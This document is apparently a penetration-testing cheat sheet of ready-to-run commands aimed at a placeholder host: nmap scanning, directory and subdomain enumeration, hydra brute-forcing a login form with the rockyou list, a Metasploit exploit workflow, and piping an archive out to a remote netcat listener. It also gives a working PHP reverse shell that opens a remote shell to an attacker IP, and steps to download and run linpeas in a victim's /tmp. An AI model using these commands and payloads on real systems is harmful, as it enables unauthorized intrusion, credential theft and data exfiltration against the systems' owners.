## Network scan with`nmap`:
```bash
nmap -v -sV -O -A --top-ports 1000 -oN nmap_output.txt example.com
```

## Directory enumeration with `dirb`:
```bash
dirb http://example.com /usr/share/wordlists/dirb/common.txt -o dirb_output.txt
```

## Subdomains enumeration with `ffuf`:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://example.com -H "Host: FUZZ.example.com" -mc 200 -fs 15949 -o ffuf_output.json -of json
```

## Login brute-force with `hydra`:
### Syntax 1
```bash
sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt http-post-form://example.com/login"&username=^USER^&password=^PASS^:F=Bad"
```
### Syntax 2
```bash
sudo hydra -v -V -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt example.com http-post-form "/login:username=^USER^&password=^PASS^=:F=Bad"
```

## Web app scan with `nikto`:
```bash
nikto -h example.com -p 80 -o nikto_output.txt
```

## Exploit with metasploit
```bash
msfconsole

show

search <exploit_name>

use exploit/linux/http/exploit_name

set RHOSTS example.com
set RPORT 80

show payloads
set payload <payload_name>

exploit
```

## Send directory with `netcat`
### Sender:
```bash
tar -czf directory.tar.gz ./directory
cat directory.tar.gz | nc example.com 1234
```
### Receiver:
```bash
nc -l -p 1234 > directory.tar.gz
```

# Archive
### Compress:
```bash
tar -czvf archive.tar.gz /path/to/directory_or_file
```
### Extract:
```bash
tar -xzvf archive.tar.gz -C /path/to/extract
```

## PHP reverse shell
```bash
nc -lvnp 4444
```
```php
<?php
$ip = 'x.x.x.x'; // change this to your IP address
$port = 4444; // change this to your listening port
$socket = fsockopen($ip, $port);
if ($socket) {
    $shell = 'uname -a; w; id; /bin/sh -i';
    fwrite($socket, $shell);
    while (!feof($socket)) {
        $command = fgets($socket);
        $output = '';
        if ($command) {
            $output = shell_exec($command);
            fwrite($socket, $output);
        }
    }
    fclose($socket);
}
?>
```

## Download and serve `linpeas`
### Sender:
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 8080
```
### Receiver
```bash
cd /tmp
wget x.x.x.x:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a > ./output.txt
less -r ./output.txt
```
